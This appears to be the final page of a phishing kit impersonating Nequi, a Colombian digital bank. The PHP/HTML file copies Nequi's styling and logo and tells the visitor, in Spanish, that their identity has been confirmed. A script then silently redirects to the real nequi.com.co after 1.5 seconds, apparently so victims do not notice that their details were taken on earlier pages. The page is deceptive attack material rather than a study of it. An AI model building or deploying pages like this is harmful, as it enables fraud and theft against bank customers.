<?php


?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <link rel="stylesheet" type="text/css" href="css/normalize.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<body><header class="ng-scope">
                <div class="wrap-header">
                    <div class="row">
                        <div class="col-xs-12 col-md-2">
                            <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi"
                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                                </a> </div>
                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
                            </div>
                        </div>
                        <div class="col-xs-12 col-md-10 container-buttons">
                            <div class="wrap-main-menu ">
                                <div class="row">
                                    <div class="col-xs-12 col-md-8"> </div>
                                    <div class="col-xs-12 col-md-4">
                                        <div class="buttons-right">
                                            <ul> <!-- ngIf: !hidePa -->
                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
                                                        class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa -->
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header><section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <img src="images/push-action-timerV2.gif" alt="" srcset="" width="20%">
                <h1 class="ng-binding">Identidad Confirmada</h1>
                <p class="ng-binding">Ya puedes seguir usando nuestros servicios</p>
                <div class="login-form-wrap">
                    <form method="POST" action="finalizar" autocomplete="off"
                        name="loginControl.formLogin" novalidate=""
                        class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
                       <img src="images/loading.gif" alt="" srcset="" width="25%">

                                
                    </form>
                </div>
            </div>
        </section>

        
    <script>
        // Espera 3000 milisegundos (3 segundos) antes de redirigir
        setTimeout(function() {
            // Cambia la URL a la que quieres redirigir
            window.location.href = 'https://www.nequi.com.co';
        }, 1500);
    </script>
    
</body>
</html>